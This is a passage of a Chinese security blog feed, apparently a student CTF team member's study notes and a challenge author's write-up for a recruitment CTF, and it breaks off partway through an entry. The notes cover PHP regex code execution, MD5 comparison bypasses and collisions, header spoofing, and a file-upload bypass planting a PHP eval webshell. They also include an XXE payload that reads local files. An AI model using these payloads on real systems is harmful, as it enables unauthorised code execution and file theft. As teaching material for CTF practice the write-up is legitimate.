由于在PHP中，对于传入的非法的 <strong>$_GET</strong> 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。 </p><p> 当非法字符为首字母时，只有点号会被替换成下划线，所以我们要做的就是换一个正则表达式，让其匹配到 <strong>{${phpinfo()}}</strong> 即可执行 <strong>phpinfo</strong> 函数。<strong>payload</strong> ： <strong>\S*=${phpinfo()}</strong> </p><p> 为什么要匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 <strong>phpinfo</strong> 函数，这是一个小坑。这实际上是 <a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。 </p><p>文章链接： <a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a> </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;参考文章链接： &lt;a href=&quot;https://xz.aliyun.com/t/2557&quot;&gt;https://xz.aliyun.com/t/2557&lt;/a&gt; &lt;/p&gt;</summary>
    
    
    
    <category term="杂谈笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="学习笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>md5比较</title>
    <link href="https://err0r.top/article/md5/"/>
    <id>https://err0r.top/article/md5/</id>
    <published>2020-12-09T05:55:00.000Z</published>
    <updated>2021-03-30T11:42:20.311Z</updated>
    
    <content type="html"><![CDATA[<p>MD5弱类型比较，强类型比较以及真实碰撞</p><a id="more"></a><h1 id="MD5比较类型"><a href="#MD5比较类型" class="headerlink" title="MD5比较类型"></a>MD5比较类型</h1><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>弱类型比较因为php特性，0e开头会被识别为科学计数法，结果0=0比较成功</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>b<span class="token operator">=</span>aabg7XSs</code></pre><p>只要是md5值为0e开头即可</p><hr><h2 id="强比较类型"><a href="#强比较类型" class="headerlink" title="强比较类型"></a>强比较类型</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>强类型比较用数组绕过，md5()函数无法解出其数值，就会得到===强比较值相等</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">111</span><span class="token operator">&amp;</span>b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>aaa</code></pre><p>传入数组即可</p><hr><h2 id="真实碰撞"><a href="#真实碰撞" class="headerlink" title="真实碰撞"></a>真实碰撞</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>真实md5碰撞，由于string()函数，不能输入数组只能输入字符串</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2<span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token operator">%</span><span class="token number">4</span>d<span class="token operator">%</span>c9<span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span>ff<span class="token operator">%</span><span class="token number">0</span>e<span class="token operator">%</span>e3<span class="token operator">%</span><span class="token number">5</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>d4<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>d3<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span>a7<span class="token operator">%</span>b2<span class="token operator">%</span><span class="token number">1</span>b<span class="token operator">%</span>dc<span class="token operator">%</span><span class="token number">56</span><span class="token operator">%</span>b7<span class="token operator">%</span><span class="token number">4</span>a<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span>c0<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">3</span>e<span class="token operator">%</span><span class="token number">7</span>b<span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span>af<span class="token operator">%</span>bf<span class="token operator">%</span>a2<span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span>a8<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span>f3<span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">8</span>e<span class="token operator">%</span><span class="token number">4</span>b<span class="token operator">%</span><span class="token number">55</span><span class="token operator">%</span>b3<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">42</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>d8<span class="token operator">%</span><span class="token number">49</span><span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">6</span>d<span class="token operator">%</span>a0<span class="token operator">%</span>d1<span class="token operator">%</span>d5<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span>fb<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span>fe<span class="token operator">%</span>a2</code></pre><p>值不等，md5相等即可。md5碰撞。</p><hr><h2 id="0e开头MD5的MD5为0e的MD5"><a href="#0e开头MD5的MD5为0e的MD5" class="headerlink" title="0e开头MD5的MD5为0e的MD5"></a>0e开头MD5的MD5为0e的MD5</h2><p>0e215962017 </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;MD5弱类型比较，强类型比较以及真实碰撞&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="学习笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>S3cCTF-出题人gyy-Writeup</title>
    <link href="https://err0r.top/article/S3cCTF-gyy-Writeup/"/>
    <id>https://err0r.top/article/S3cCTF-gyy-Writeup/</id>
    <published>2020-11-23T10:18:25.000Z</published>
    <updated>2021-03-30T11:50:50.345Z</updated>
    
    <content type="html"><![CDATA[<h1 id="S3cCTF-gyy-Writeup"><a href="#S3cCTF-gyy-Writeup" class="headerlink" title="S3cCTF-gyy-Writeup"></a>S3cCTF-gyy-Writeup</h1><p><strong>出题人：gyy</strong></p><p><strong>写在前面：</strong></p><p>本次招新赛我主要负责WEB方面的出题，当然兼顾一些MISC，本着简单易懂的原则，刚开始出了很多简单WEB题，但是这届新生的实力明显比我们当时强= =，后期又赶了一些提升题，当然和真正的CTF比赛还是有非常大的距离，例如在群里放出的周六的题目可以看出。所以，这些只是入门CTF的基础，去年的这时，我们参加的招新比赛比今年更加困难（所以今年我有同感地出了不少简单题），我希望大家不要止步于此，当初我也有一腔热血，觉得CTF不过如此（甚至还想双修）。但，走的越高，越会发现自己越渺小，这条道路可能还没有尽头。技术可以后期培养，这次招新比赛分数也只能作为检测基础的测试，如果你有强烈的意向和兴趣，比比赛成绩更为重要，我们欢迎你和我们联系，希望大家不忘初心，砥砺前行。</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="How-to-solve-ctf"><a href="#How-to-solve-ctf" class="headerlink" title="How_to_solve_ctf"></a>How_to_solve_ctf</h2><h3 id="出题解析"><a href="#出题解析" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题旨在指引大家，考了一下HTML的知识</p><h3 id="解题方式"><a href="#解题方式" class="headerlink" title="解题方式"></a>解题方式</h3><p>F12查看源代码，给了提示<code>&lt;!-- html元素是可以修改的 --&gt;</code><br>修改form表单里input文本框的长度限制，提交s3c2020即可获得flag<br>由于是GET传参，也可以直接传<code>key=s3c2020</code>即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122173122547.png" class="" title="web1" loading="lazy"><hr><h2 id="nof12"><a href="#nof12" class="headerlink" title="nof12"></a>nof12</h2><h3 id="出题解析-1"><a href="#出题解析-1" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题利用script限制了鼠标右键和f12</p><h3 id="解题方式-1"><a href="#解题方式-1" class="headerlink" title="解题方式"></a>解题方式</h3><p>与题目 <strong>S3C_NOT_BAD</strong> 重复，Ctrl+U或者burp抓包或者curl访问都可</p><img src="/article/S3cCTF-gyy-Writeup/20201122174018834.png" class="" title="web2" loading="lazy"><hr><h2 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h2><h3 id="出题解析-2"><a href="#出题解析-2" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题旨在考XFF（X-Forwarded-For）和Referer<br>伪造地址三种方式：</p><pre class="language-none"><code class="language-none">Client-Ip: 127.0.0.1X-Forwarded-For: 127.0.0.1Host: 127.0.0.1Referer: 127.0.0.1</code></pre><h3 id="解题方式-2"><a href="#解题方式-2" class="headerlink" title="解题方式"></a>解题方式</h3><p>只有本地管理员才能访问本页面！<br>burp抓包修改即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122174702383.png" class="" title="web3" loading="lazy"><hr><h2 id="Flag-not-found"><a href="#Flag-not-found" class="headerlink" title="Flag not found"></a>Flag not found</h2><h3 id="出题解析-3"><a href="#出题解析-3" class="headerlink" title="出题解析"></a>出题解析</h3><p>302重定向</p><pre class="language-php" data-language="php"><code class="language-php">//flag.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Flag: '</span><span class="token punctuation">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"s3c&#123;0H_mY_g0d_its_4O4&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//修改 X-Powered-By信息</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location:404.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">//404.php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Not Found<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- 才怪 --></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"http/1.1 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"status: 404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;p>The requested URL /flag.php was not found on this server.&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><h3 id="解题方式-3"><a href="#解题方式-3" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开点击后跳转Not Found，仔细看发现界面是伪造的</p><img src="/article/S3cCTF-gyy-Writeup/20201122175207502.png" class="" width="404" loading="lazy"><p>因为界面是我自己写的假界面，特意写了个注释，由此想到重定向<br>直接在header里能看到flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122175439466.png" class="" title="flag" loading="lazy"><p>拿去base64解一下即可获得flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122175814189.png" class="" title="base64" loading="lazy"><hr><h2 id="快速计算"><a href="#快速计算" class="headerlink" title="快速计算"></a>快速计算</h2><h3 id="出题解析-4"><a href="#出题解析-4" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考查PHP和Python脚本，3秒内…有人能做得到嘛？</p><p>本题网上找一个脚本改改完全没问题，其实还有一题计算字符串（原创题目前网上没有脚本），师傅们说不放就没放啦，有兴趣可以做做 <a href="http://49.234.89.193:8088/">题目链接</a>(链接可能会挂，题目随时可能哪天我就关了…)</p><h3 id="解题方式-4"><a href="#解题方式-4" class="headerlink" title="解题方式"></a>解题方式</h3><p>请在3秒内计算以下算式并提交并提交<br>在服务器设的SESSION，3秒刷新，超时也是不算的<br>设了个小坑，抓个包可以看到，每次提交的请求还有个参数<code>submits=提交</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122180918644.png" class="" title="参数" loading="lazy"><p>如果没有就会die退出</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submits'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"少了点东西啊...好好看看吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最后放出Payload，师傅们可以自己研究</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/11/22 18:14@Auth ： gyy@File ：1.py@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://49.234.89.193:8029/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submits"</span> <span class="token punctuation">:</span> <span class="token string">"提交"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1--------------------取算式"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> response<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2--------------------计算算式"</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"3--------------------提交"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resultres <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span> data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122181549903.png" class="" title="calnum" loading="lazy"><p>本人蹩脚自学的python，语法规范问题请见谅</p><hr><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><h3 id="出题解析-5"><a href="#出题解析-5" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考察Linux下Vim的应用，同时考察PHP代码审计及robots协议</p><p>给了hint：vim强退会在当前目录生成生成备份文件</p><h3 id="解题方式-5"><a href="#解题方式-5" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开先看源代码</p><img src="/article/S3cCTF-gyy-Writeup/20201122192109829.png" class="" title="vim" loading="lazy"><p>Recover<br>Linux中，如果vim强退的话（ctrl+z）就会在目录下生成备份文件，如图所示</p><img src="/article/S3cCTF-gyy-Writeup/20201122192350871.png" class="" title="ctrl+z" loading="lazy"><p>而再vim编辑就会有如下提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122192439588.png" class="" title="re" loading="lazy"><p>直接Recover恢复即可。</p><p>根据提示，访问./.index.php.swp。发现下载.swp文件<br>这里注意，备份文件是隐藏文件，文件名前面有个点<br>拿去linux系统恢复，可以发现</p><img src="/article/S3cCTF-gyy-Writeup/20201122192914742.png" class="" title="flag1" loading="lazy"><p>由此，flag分为多部分<br>接下来代码审计很简单，回到index.php，POST传参</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>pazzword<span class="token operator">=</span>a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122193206215.png" class="" title="flag2" loading="lazy"><p>机器人会告诉你剩下的，联想robots协议，访问./robots.txt</p><img src="/article/S3cCTF-gyy-Writeup/20201122193300252.png" class="" title="robots" loading="lazy"><p>可得flag在./r/o/b/o/a/t/s/1.php</p><img src="/article/S3cCTF-gyy-Writeup/20201122193344579.png" class="" title="flag3" loading="lazy"><p>将三段flag组合即可</p><hr><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><h3 id="出题解析-6"><a href="#出题解析-6" class="headerlink" title="出题解析"></a>出题解析</h3><p>本题考察文件上传，考察上传绕过的姿势，因为比赛限制，没有出太难的过滤</p><h3 id="解题方式-6"><a href="#解题方式-6" class="headerlink" title="解题方式"></a>解题方式</h3><p>当然，不是真的让你上传个动图。。我服务器里发现了好多奇奇怪怪的图片<br>一般文件上传一句话木马直接获取shell<br><code>&lt;?php @eval($_POST[gyy])?&gt;</code><br>需要能被php解析才行，.txt,.gif都是不可被解析的<br>或者直接用script标签<br><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[gyy]);&lt;/script&gt;</code><br>后缀名限制</p><img src="/article/S3cCTF-gyy-Writeup/20201122194102133.png" class="" title="php" loading="lazy"><p>上传普通图片，被过滤</p><img src="/article/S3cCTF-gyy-Writeup/20201122193716205.png" class="" title="gif" loading="lazy"><p>抓包上传,原始如下</p><img src="/article/S3cCTF-gyy-Writeup/20201122194225470.png" class="" title="post1" loading="lazy"><p>修改如下</p><img src="/article/S3cCTF-gyy-Writeup/20201122195020428.png" class="" title="post2" loading="lazy"><p>请求头检查：content-type，MIME类型限制，修改为<code>image/gif</code><br>文件后缀绕过：只要能被php解析的文件名就可以<br>这里我只限制了<code>.php</code>,<code>.php3</code>,<code>.php4</code>,<code>.php5</code><br>MIME类型限制只允许<code>image/gif</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122195119845.png" class="" title="upload" loading="lazy"><p>然后访问文件</p><img src="/article/S3cCTF-gyy-Writeup/20201122195246767.png" class="" title="upload2" loading="lazy"><p>发现代码被执行了，直接蚁剑连上get shell</p><img src="/article/S3cCTF-gyy-Writeup/20201122195418743.png" class="" title="upload3" loading="lazy"><p>根目录发现flag</p><img src="/article/S3cCTF-gyy-Writeup/20201122195438365.png" class="" title="upload4" loading="lazy"><p>你们真的传了一堆堆奇奇怪怪的图片。。。</p><hr><h2 id="XML-External-Entity"><a href="#XML-External-Entity" class="headerlink" title="XML External Entity"></a>XML External Entity</h2><h3 id="出题解析-7"><a href="#出题解析-7" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察XXE注入，即 XML实体注入</p><h3 id="解题方式-7"><a href="#解题方式-7" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开直接给phpinfo，源代码有提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122195910990.png" class="" title="hint" loading="lazy"><p>底部发现</p><img src="/article/S3cCTF-gyy-Writeup/20201122195933621.png" class="" title="system" loading="lazy"><p>其实是执行了<code>system(&quot;ls&quot;);</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122200056166.png" class="" title="index" loading="lazy"><p>然后每个文件都高亮了语法，<code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code>均可触发XXE漏洞，具体输出点请阅读这三个文件的代码。存在的XXE漏洞具体可以百度研究一下。<br>样例Payload：</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;</code></pre><img src="/article/S3cCTF-gyy-Writeup/20201122200729886.png" class="" title="dom" loading="lazy"><p>其实还可以利用写入一句话木马等操作。</p><hr><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="信息搜索"><a href="#信息搜索" class="headerlink" title="信息搜索"></a>信息搜索</h2><h3 id="出题解析-8"><a href="#出题解析-8" class="headerlink" title="出题解析"></a>出题解析</h3><p>信息搜索也是门技术，好好利用搜索引擎可以达到事半功倍的效果.<br>确实，只要仔细搜索，没有任何问题</p><h3 id="解题方式-8"><a href="#解题方式-8" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开五道题，一道道解决</p><h4 id="1-截至2020年10月31日，RFC最新的正式文档编号是多少"><a href="#1-截至2020年10月31日，RFC最新的正式文档编号是多少" class="headerlink" title="1.截至2020年10月31日，RFC最新的正式文档编号是多少?"></a>1.截至2020年10月31日，RFC最新的正式文档编号是多少?</h4><p>RFC文档，Request For Comments，官网连<em>科学上网</em>都不需要</p><img src="/article/S3cCTF-gyy-Writeup/20201122201134715.png" class="" title="rfc" loading="lazy"><p>访问<code>https://www.ietf.org/</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122201307663.png" class="" title="rfc" loading="lazy"><p>或者直接访问RFC文档搜索网站<code>https://www.rfc-editor.org/search/rfc_search.php</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122201725572.png" class="" title="rfc" loading="lazy"><p>截至2020年10月31日，一查</p><img src="/article/S3cCTF-gyy-Writeup/20201122201943714.png" class="" title="rfc" loading="lazy"><p>最新为RFC8940<br>这种东西最标准还是去官网查</p><h4 id="2-国家网络安全宣传周第一届是在哪一年举行的？"><a href="#2-国家网络安全宣传周第一届是在哪一年举行的？" class="headerlink" title="2.国家网络安全宣传周第一届是在哪一年举行的？"></a>2.国家网络安全宣传周第一届是在哪一年举行的？</h4><p>2014</p><img src="/article/S3cCTF-gyy-Writeup/20201122202110805.png" class="" width="2014" loading="lazy"><h4 id="3-本校校园卡上对应的教学楼是主校区的几号教学楼？"><a href="#3-本校校园卡上对应的教学楼是主校区的几号教学楼？" class="headerlink" title="3. 本校校园卡上对应的教学楼是主校区的几号教学楼？"></a>3. 本校校园卡上对应的教学楼是主校区的几号教学楼？</h4><p>拿出来看看…百度地图打开，</p><img src="/article/S3cCTF-gyy-Writeup/20201122202320233.png" class="" width="1" loading="lazy"><p>全景地图</p><img src="/article/S3cCTF-gyy-Writeup/20201122202433684.png" class="" width="1" loading="lazy"><p>有点老，仔细观察地图，只有1教有那么大地方，2教3教都不会有那么大的中央空地<img src="/article/S3cCTF-gyy-Writeup/20201122202751489.jfif" class="" width="1" loading="lazy"><br>good</p><h4 